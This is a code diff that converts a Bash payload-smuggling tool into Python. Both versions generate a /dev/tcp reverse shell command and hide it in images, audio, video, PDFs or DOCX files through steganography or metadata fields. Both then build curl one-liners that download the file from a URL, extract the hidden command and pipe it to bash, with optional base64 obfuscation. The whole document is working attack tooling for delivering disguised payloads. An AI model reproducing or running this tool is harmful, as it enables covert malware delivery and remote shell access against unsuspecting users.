@@ -1,217 +1,156 @@
+import os
+import subprocess
+import base64
+import logging
+import argparse
+
+# Setup logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
 # Dynamic media compatibility check
-is_media_compatible() {
-    local file_extension="$1"
-    local media_types=("png" "jpg" "jpeg" "mp3" "mp4" "gif" "pdf" "docx" "zip")
- 
-    for media in "${media_types[@]}"; do
-        if [ "$file_extension" == "$media" ]; then
-            return 0
-        fi
-    done
-    return 1
-}
- 
+def is_media_compatible(file_extension):
+    media_types = ["png", "jpg", "jpeg", "mp3", "mp4", "gif", "pdf", "docx", "zip"]
+    return file_extension.lower() in media_types
+
 # Generate reverse shell payload dynamically
-generate_payload() {
-    local payload_type="$1"
-    local ip="$2"
-    local port="$3"
- 
-    if [[ "$payload_type" == "reverse_shell" ]]; then
-        echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
-    else
-        echo -e "\e[91mError: Unsupported payload type.\e[0m"
-        exit 1
-    fi
-}
- 
+def generate_payload(payload_type, ip, port):
+    if payload_type == "reverse_shell":
+        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+        logging.info(f"Generated reverse shell payload for IP: {ip}, Port: {port}")
+        return payload
+    else:
+        logging.error("Unsupported payload type")
+        raise ValueError("Unsupported payload type")
+
 # Inject payload into media file using steganography
-inject_with_steganography() {
-    local command="$1"
-    local filename="$2"
-    steghide embed -cf "$filename" -ef <(echo "$command") -p ""
-}
- 
+def inject_with_steganography(command, filename):
+    try:
+        subprocess.run(["steghide", "embed", "-cf", filename, "-ef", "/dev/stdin", "-p", ""], input=command.encode(), check=True)
+        logging.info(f"Payload successfully injected into {filename} using steganography.")
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Steganography injection failed: {e}")
+
+# Inject payload using metadata tools
+def inject_metadata(command, filename):
+    file_extension = filename.split('.')[-1].lower()
+    try:
+        if file_extension in ["png", "jpg"]:
+            subprocess.run(["exiftool", f"-Comment={command}", filename], check=True)
+        elif file_extension in ["mp4", "mp3"]:
+            subprocess.run(["ffmpeg", "-i", filename, "-metadata", f"comment={command}", "-codec", "copy", f"injected_{filename}"], check=True)
+        elif file_extension == "pdf":
+            subprocess.run(["exiftool", f"-Title={command}", filename], check=True)
+        elif file_extension == "docx":
+            with open("temp.txt", "w") as f:
+                f.write(command)
+            subprocess.run(["zip", filename, "temp.txt"], check=True)
+            os.remove("temp.txt")
+        else:
+            logging.error(f"Unsupported media type for command injection: {file_extension}")
+            raise ValueError(f"Unsupported media type: {file_extension}")
+        logging.info(f"Payload successfully injected into {filename}")
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Metadata injection failed: {e}")
+
 # Extract payload from the media file
-extract_payload() {
-    local filename="$1"
-    local file_extension="${filename##*.}"
- 
-    if [[ "$file_extension" == "png" || "$file_extension" == "jpg" ]]; then
-        exiftool "$filename" | grep "Comment"
-    elif [[ "$file_extension" == "mp4" || "$file_extension" == "mp3" ]]; then
-        ffprobe -v error -show_entries format_tags=comment -of default=nw=1:nk=1 "$filename"
-    elif [[ "$file_extension" == "pdf" ]]; then
-        pdfinfo "$filename" | grep "Title"
-    elif [[ "$file_extension" == "docx" ]]; then
-        unzip -p "$filename" | strings | grep "Payload"
-    elif [[ "$file_extension" == "zip" ]]; then
-        unzip -p "$filename" | strings | grep "Payload"
-    else
-        echo -e "\e[91mError: File extension not supported for payload extraction.\e[0m"
-    fi
-}
- 
-# Flag variables
-encode_base64=false
-use_steganography=false
-extract_mode=false
-generate_reverse_shell=false
-payload_type=""
-ip=""
-port=""
- 
-# Parse command-line options
-while [[ $# -gt 0 ]]; do
-    case "$1" in
-        -h|--help)
-            show_help
-            exit 0
-            ;;
-        -e|--encode)
-            encode_base64=true
-            shift
-            ;;
-        -c|--check)
-            check_compatibility=true
-            shift
-            ;;
-        -p|--payload)
-            payload_type="$2"
-            shift 2
-            ;;
-        -s|--steganography)
-            use_steganography=true
-            shift
-            ;;
-        -x|--extract)
-            extract_mode=true
-            shift
-            ;;
-        *)
-            break
-            ;;
-    esac
-done
- 
-# Check for the correct number of arguments
-if [ $# -lt 3 ]; then
-    echo -e "\e[91mError: Invalid number of arguments.\e[0m"
-    show_help
-    exit 1
-fi
- 
-# Assign arguments
-command="$1"
-filename="$2"
-url="$3"
- 
-# Extract file extension
-file_extension="${filename##*.}"
- 
-# Compatibility check
-if $check_compatibility; then
-    if is_media_compatible "$file_extension"; then
-        echo -e "\e[92mFile type $file_extension is compatible.\e[0m"
-    else
-        echo -e "\e[91mError: File extension $file_extension is not supported.\e[0m"
-        exit 1
-    fi
-fi
- 
-# Payload generation (reverse shell)
-if [[ "$payload_type" == "reverse_shell" ]]; then
-    read -p "Enter IP address for reverse shell: " ip
-    read -p "Enter port for reverse shell: " port
-    command=$(generate_payload "$payload_type" "$ip" "$port")
-fi
- 
-# Extract payload mode
-if $extract_mode; then
-    extract_payload "$filename"
-    exit 0
-fi
- 
-# Inject the payload
-if is_media_compatible "$file_extension"; then
-    if $use_steganography; then
-        echo -e "\e[95mInjecting payload using steganography...\e[0m"
-        inject_with_steganography "$command" "$filename"
-        echo -e "\e[95mSteganography-based injection completed.\e[0m"
-    else
-        echo -e "\e[95mInjecting payload into media file...\e[0m"
-        if [[ "$file_extension" == "png" || "$file_extension" == "jpg" ]]; then
-            exiftool -Comment="$command" "$filename"
-        elif [[ "$file_extension" == "mp4" || "$file_extension" == "mp3" ]]; then
-            ffmpeg -i "$filename" -metadata comment="$command" -codec copy "injected_$filename"
-        elif [[ "$file_extension" == "pdf" ]]; then
-            exiftool -Title="$command" "$filename"
-        elif [[ "$file_extension" == "docx" ]]; then
-            echo "$command" > temp.txt
-            zip "$filename" temp.txt
-            rm temp.txt
-        else
-            echo -e "\e[91mError: Unsupported media type for command injection.\e[0m"
-            exit 1
-        fi
-        echo -e "\e[95mMedia file payload injection completed.\e[0m"
-    fi
-else
-    echo -e "\e[91mError: File extension $file_extension is not supported.\e[0m"
-    exit 1
-fi
- 
-# Generate one-liner method for execution
-echo -e "\e[36mSelect a one-liner method for execution:\e[0m"
-echo "1. image-exiftool-one-liner"
-echo "2. video-ffprobe-one-liner"
-echo "3. pdf-title-extraction-one-liner"
-echo "4. docx-text-extraction-one-liner"
-read -p "Enter the method number (1-4): " method_choice
- 
-case "$method_choice" in
-    1)
-        cmd="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
-        ;;
-    2)
-        cmd="curl -s '$url/$filename' | ffprobe -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
-        ;;
-    3)
-        cmd="curl -s '$url/$filename' | exiftool -Title -b - | bash"
-        ;;
-    4)
-        cmd="curl -s '$url/$filename' | unzip -p - | grep Payload | bash"
-        ;;
-    *)
-        echo -e "\e[91mError: Invalid method number.\e[0m"
-        exit 1
-        ;;
-esac
- 
-# Base64 encode the one-liner if requested
-if [ "$encode_base64" = true ]; then
-    encoded_cmd=$(echo -n "$cmd" | base64)
-    encoded_cmd="${encoded_cmd//[$'\t\r\n ']/}"
-    echo -e "\e[0;36mSelect a decoding method:\e[0m"
-    echo "1. Using awk"
-    echo "2. Using xargs"
-    read -p "Enter the decoding method number (1-2): " decode_method
- 
-    case "$decode_method" in
-        1)
-            echo "echo '$encoded_cmd' | awk '{ print \$0}' | base64 -d | sh"
-            ;;
-        2)
-            echo "echo '$encoded_cmd' | base64 -d | xargs -I {} sh -c \"{}\""
-            ;;
-        *)
-            echo "Invalid decoding method number."
-            exit 1
-            ;;
-    esac
-else
-    one_liner="$cmd"
-    echo -e "Generated one-liner:\n\e[0;31m$one_liner\e[0m"
-fi
- 
-echo -e "\e[0;36mOne-liner method execution completed.\e[0m"
+def extract_payload(filename):
+    file_extension = filename.split('.')[-1].lower()
+
+    try:
+        if file_extension in ["png", "jpg"]:
+            result = subprocess.run(["exiftool", filename], stdout=subprocess.PIPE, check=True)
+        elif file_extension in ["mp4", "mp3"]:
+            result = subprocess.run(["ffprobe", "-v", "error", "-show_entries", "format_tags=comment", "-of", "default=nw=1:nk=1", filename], stdout=subprocess.PIPE, check=True)
+        elif file_extension == "pdf":
+            result = subprocess.run(["pdfinfo", filename], stdout=subprocess.PIPE, check=True)
+        elif file_extension in ["docx", "zip"]:
+            result = subprocess.run(["unzip", "-p", filename], stdout=subprocess.PIPE, check=True)
+        else:
+            logging.error(f"Unsupported media type for payload extraction: {file_extension}")
+            raise ValueError(f"Unsupported media type: {file_extension}")
+
+        logging.info(f"Payload extracted from {filename}")
+        print(result.stdout.decode())
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Failed to extract payload: {e}")
+
+# Base64 encoding and decoding
+def base64_encode_command(command):
+    encoded_cmd = base64.b64encode(command.encode()).decode()
+    logging.info("Payload encoded in base64")
+    return encoded_cmd
+
+def generate_oneliner(command, url, filename, method_choice):
+    methods = {
+        "1": f"curl -s '{url}/{filename}' | exiftool -Comment -b - | bash",
+        "2": f"curl -s '{url}/{filename}' | ffprobe -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash",
+        "3": f"curl -s '{url}/{filename}' | exiftool -Title -b - | bash",
+        "4": f"curl -s '{url}/{filename}' | unzip -p - | grep Payload | bash"
+    }
+    return methods.get(method_choice, None)
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="Payload injection and extraction tool with steganography and metadata support.")
+    parser.add_argument("-p", "--payload", type=str, help="Specify payload type (e.g., reverse_shell)")
+    parser.add_argument("-i", "--ip", type=str, help="IP address for reverse shell payload")
+    parser.add_argument("-r", "--port", type=str, help="Port for reverse shell payload")
+    parser.add_argument("-f", "--file", type=str, help="Filename for payload injection/extraction")
+    parser.add_argument("-u", "--url", type=str, help="URL for generated one-liner")
+    parser.add_argument("-s", "--steganography", action="store_true", help="Use steganography for payload injection")
+    parser.add_argument("-x", "--extract", action="store_true", help="Extract payload from file")
+    parser.add_argument("-b", "--base64", action="store_true", help="Base64 encode the generated payload")
+    parser.add_argument("-c", "--check", action="store_true", help="Check media file compatibility")
+    return parser.parse_args()
+
+def main():
+    args = parse_args()
+    
+    # Validate and generate payload if requested
+    if args.payload and args.payload == "reverse_shell":
+        if args.ip and args.port:
+            command = generate_payload(args.payload, args.ip, args.port)
+        else:
+            logging.error("IP and port are required for reverse_shell payload")
+            exit(1)
+    else:
+        command = args.payload
+    
+    # Check file compatibility
+    if args.check:
+        if is_media_compatible(args.file.split('.')[-1]):
+            logging.info(f"File type {args.file.split('.')[-1]} is compatible")
+        else:
+            logging.error(f"File type {args.file.split('.')[-1]} is not supported")
+            exit(1)
+
+    # Payload extraction mode
+    if args.extract:
+        extract_payload(args.file)
+        exit(0)
+    
+    # Payload injection
+    if args.file and is_media_compatible(args.file.split('.')[-1]):
+        if args.steganography:
+            inject_with_steganography(command, args.file)
+        else:
+            inject_metadata(command, args.file)
+    else:
+        logging.error(f"Invalid or unsupported file: {args.file}")
+        exit(1)
+
+    # Generate one-liner method for execution
+    if args.url and args.file:
+        method_choice = input("Select method (1-4):\n1. Image-Exiftool\n2. Video-Ffprobe\n3. PDF-Title Extraction\n4. DOCX-Text Extraction\n")
+        one_liner = generate_oneliner(command, args.url, args.file, method_choice)
+        if one_liner:
+            if args.base64:
+                one_liner = base64_encode_command(one_liner)
+                print(f"Base64 encoded one-liner:\n{one_liner}")
+            else:
+                print(f"Generated one-liner:\n{one_liner}")
+        else:
+            logging.error("Invalid method choice")
+            exit(1)
+
+if __name__ == "__main__":
+    main()
